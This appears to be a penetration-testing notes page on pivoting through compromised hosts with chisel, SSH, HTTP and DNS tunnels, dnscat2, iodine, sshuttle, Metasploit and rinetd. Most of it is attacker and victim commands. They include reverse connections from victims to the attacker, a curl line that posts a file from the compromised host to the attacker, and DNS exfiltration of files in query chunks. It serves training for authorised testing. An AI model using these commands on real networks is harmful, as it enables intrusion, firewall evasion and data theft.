# As before, add the line socks5 127.0.0.1 1080 to the bottom of /etc/proxychains4.conf and execute all commands with proxychains -q in front.
# If the jump host runs a version of SSH which is older than 7.6 You need to execute two commands instead of one. I got that from here.
# connect to localhost on port 54321 while moving ssh to the background 
ssh -f -N -D 54321 localhost
# connect to the target while tunneling the SOCKS traffic thru localhost:54321
ssh root@pivotmachine host -R1080:localhost:54321

# FORWARD SOCKS PROXY
./chisel server -p LISTEN_PORT --socks5 #victim
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks #attacking machine
# REMEMBER TO CHANGE AND USE SOCKS5 ON PROXYCHAINS CONFIG FILE

# REMOTE PORT FORWARDING (we connect back from the victim to create the forward)
chisel server -p 9999 --reverse # In local machine / listening port 9999
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &#x26; #(victim)
chisel client 10.0.0.1:9999 R:8090:172.16.22.2:8000 # In remote machine / replace 10.0.0.1 with your local ip
# After that, we can access to http://localhost:8090/ in local machine. In short, we can access to http://172.16.22.2:8000/ via localhost:8090.
netstat -tulpn #We can confirm this is open successfully if we run on Kali:
# Try curl to confirm.
curl http://localhost:8090 # The result is the content of http://172.16.22.2:8000/

# LOCAL PORT FORWARDING - from our own attacking machine to a chisel server (victim)
./chisel server -p LISTEN_PORT # Compromised machine
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT #Attacking
</code></pre>

## Deep Packet Inspection

{% hint style="info" %}
When SSH and other ports are not allowed into, out of, or across the network, but some HTTP/DNS port are open and unused.
{% endhint %}

### HTTP Tunneling

{% code overflow="wrap" %}
```bash
# To debug the connection
sudo tcpdump -nvvvXi tun0 tcp port 8080
# If tcpdump and chisel do not see any traffic/connection when we tried, troubleshoot by error-collecting-and-sending command string back to our Kali
chisel client $KALI_IP:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://$KALI_IP:8080/

# Chisel (encapsulates our data stream within HTTP and uses SSH protocol so data will be encrypted)
# In case A -> B -> C // want to reach C from B but B only has a port allowed for inbound and only HTTP traffic outbound so we need to use HTTP outbound and not typicial SSH pfwd
# reverse port forwarding (more or less like remote pfwd w/ SSH)
kali@kali:~$ chisel server --port 8080 --reverse # run the server on Kali
/tmp/chisel client $KALI_IP:8080 R:socks > /dev/null 2>&1 & # run the client on the compromised machine
# We should get verbose on the chisel server, let's check as well the SOCKS proxy on kali
ss -tulpn | grep 1080 # we should see 127.0.0.1:1080 with chisel running
# We cannot access SSH of machine C with ssh command since the port forwarding was not set via SSH. We need ProxyCommand option with ncat
kali@kali:~$ sudo apt install ncat
kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' $USER@$C_TARGET_IP


# Example asuming deep packet content inspection feature has been implemented and only allows HTTP protocol. In addition, the firewall in this scenario only allows ports 80, 443, and 1234 inbound and outbound. 
# Get hts binary to place it on the victim in order to act as server from here:
https://http-tunnel.sourceforge.net/
# Alternative software
https://www.stunnel.org/
https://github.com/apurvsinghgautam/HTTP-Reverse-Shell
apt-cache search httptunnel
sudo apt install httptunnel
# Forwarding TCP port 8888 on our compromised Linux machine to TCP port 3389 on the Windows Server 2016 system
ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
# Setting up the server component of HTTPTunnel (victim)
hts --forward-port localhost:8888 1234
ps aux | grep hts
ss -antp | grep "1234"
# Setting up the client component of HTTPTunnel (attacker)
htc --forward-port 8080 10.11.0.128:1234
ps aux | grep htc
ss -antp | grep "8080"
```
{% endcode %}

### DNS Tunneling

{% code overflow="wrap" fullWidth="true" %}
```sh
# In real world, steps would be register a domain name, set up authoritative name server and tell the domain name that a specific server should be known as the authoritative name server for domain.corp zonee.
# A reaches B and D, C reaches B but cannot communicate neither to D nor A directly. We need a shell on B and D to make C connectable through them

# Use this config file on D machine
user@D cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts 
no-resolv 
no-hosts

# Define the zone 
auth-zone=domain.corp 
auth-server=domain.corp

# Now run it in no daemon mode
user@D sudo dnsmasq -C dnsmasq.conf -d
# On another shell of D machine we could listen the DNS packets to confirm the traffic ongoing
user@D sudo tcpdump -i tun0 udp port 53
# On C machine check the DNS settings (DNS resolution is handled by systemd-resolved)
user@C resolvectl status
# Make DNS request from C to D
user@C nslookup exfiltrated-data.domain.corp
# When using dnsmasq.conf and go for nslookup from C target is normal to see cannot find NXDOMAIN because we are not serving records yet.
# Where we were listening on C machine with tcpdump we should get that request.
# This is exfiltration of small chunks. For a binary file, convert it into a long hex string, split it and send each chunk like [hex-chunk].domain.corp. On the server side, log all requests and convert them back to a full binary.
# To infiltrate data (from D to C) use TXT record. First kill dnsmasq task before and use this other config:
user@D cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts 
no-resolv 
no-hosts

# Define the zone 
auth-zone=domain.corp 
auth-server=domain.corp
# TXT record 
txt-record=www.domain.corp,juicy data
txt-record=www.domain.corp,juicy data 2nd part
user@D sudo dnsmasq -C dnsmasq.conf -d
# Now make a request from C to the DNS server on D in order to get the data
user@C nslookup -type=txt www.domain.corp
# To infiltrate binary data, serve it as base64 encoded TXT records and convert them back on the internal server

######## with dnscat2 (exfiltrate data with DNS subdomain queries and infiltrate data with TXT and other records)
# dnscat2 server runs on an auth name server and clients are run on compromised machines
# Listen on D machine just to check traffic (will be a lot when DNS server and client communicate)
user@D sudo tcpdump -i tun0 udp port 53
# On another shell run dnscat2-server with the domain as argument
user@D dnscat2-server domain.corp
# Run the dnscat client binary on D machine and pass the domain as argument
user@C ./dnscat domain.corp # we should see connection established and a string, the same on client and server to verify integrity
# Now on the server we list all active windows and select the one is there plus list commands
dnscat2> windows
dnscat2> window -i 1
command (Cmachine) 1> ?
# With listen command we can set up a listening port on the server (usage is like ssh -L)
command (Cmachine) 1> listen 127.0.0.1:6666 172.16.7.27:445 # 172.x.x.x is the target IP (dnscat client)
# From another shell now we could access that SMB port
user@D smbclient -p 6666 -L //127.0.0.1 -U $USER --password=$PASS

# TCPoverDNS
https://github.com/yarrick/iodine
    Ensure to update the DNS records and create new NS (nameserver) points to your AttackBox machine
    Run iodined server from AttackBox or the Attacker machine. (note for the server side we use iodined)
    On JumpBox/pivot machine, run the iodine client to establish the connection. (note for the client side we use iodine - without d)
    SSH to the machine on the created network interface to create a proxy over DNS. We will be using the -D argument to create a dynamic port forwarding.
    Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.
# run server on the attacker, set network IP for the new dns0 interface (server IP 10.1.1.1 / client IP 10.1.1.2), att
thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 name.server.com
# on the jumpbox/pivot machine, use the client to connect to the server
thm@jump-box:~$ sudo iodine -P thmpass name.server.com
# Now on the attacker machine we use ssh session as a proxy 
ssh thm@10.1.1.2 -4 -f -N -D 1080
# Now that we have connected to JumpBox/pivot over the dns0 network, open a new terminal and use ProxyChains or Firefox with 127.0.0.1 and port 1080 as proxy settings. 
root@attacker$ proxychains curl http://192.168.0.100/demo.php
root@attacker$ #OR
root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
```
{% endcode %}

## sshuttle (Linux only)

{% code overflow="wrap" %}
```bash
sudo apt install sshuttle

# NOTE: it requires root privileges on the SSH client and Python3 on the SSH server
# A -> B -> C -> D   //  from B with C creds (SSH) we will access D subnet
compromised@machine socat TCP-LISTEN:4444,fork TCP:10.8.8.20:22 # listening port, C machine IP and destination port 
kali@kali sshuttle -r user@B_TARGET_IP:4444 10.4.50.0/24 172.16.15.0/24 # user@IP is C machine SSH creds, then the C subnets we want to tunnel
# Then we could access a specific D target visible from C host using Kali attacking machine, to connect to its SMB port for example
kali@kali smbclient -L //172.16.15.7/ -U $USER --password=$PASS


sshuttle -r username@address subnet  #e xample
# 172.16.0.x network with a compromised server at 172.16.0.5
sshuttle -r user@172.16.0.5 172.16.0.0/24

# -N to not specify subnet and try to guess it automatically
sshuttle -r username@address -N

# key-based authentication
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET

# If broken pipe error code, exclude the compromised machine from the subnet
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```
{% endcode %}

## Metasploit

```bash
# Read this: https://www.offensive-security.com/metasploit-unleashed/pivoting/
# Example: 
meterpreter > run autoroute -s 172.17.0.0/24 #(general format where the IP is)

# And read this: https://www.offensive-security.com/metasploit-unleashed/portfwd/
# Example:
portfwd add -l 81 -p 8983 -r 172.17.0.1
# This makes your browser -> localhost:81 able to reach 172.17.0.1:8983

##################
msf6 exploit(multi/handler) > use multi/manage/autoroute 
msf6 post(multi/manage/autoroute) > set session 1 # or whatever session id is our compromised pivot machine
msf6 post(multi/manage/autoroute) > run
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

cat /etc/proxychains4.conf 
... 
socks5 127.0.0.1 1080
```

## RINETD

{% code overflow="wrap" %}
```bash
sudo apt update && sudo apt install rinetd
https://boutell.com/rinetd/
# The rinetd configuration file, /etc/rinetd.conf, lists forwarding rules that require four parameters, Mo including bindaddress and bindport, which define the bound (“listening”) IP address and port, and a connectaddress and connectport, which define the traffic’s destination address and port: 
cat /etc/rinetd.conf
# forwarding rules come here
# bindadress    bindport  connectaddress  connectport
...
# Adding the forwarding rule to the rinetd configuration file
# bindadress    bindport  connectaddress  connectport
0.0.0.0 80 216.58.207.142 80
# This rule states that all traffic received on port 80 of our Kali Linux server, listening on all interfaces (0.0.0.0), regardless of destination address, will be redirected to 216.58.207.142:80
# Then we restart the service
sudo service rinetd restart

nc -nvv $IP $PORT
```
{% endcode %}
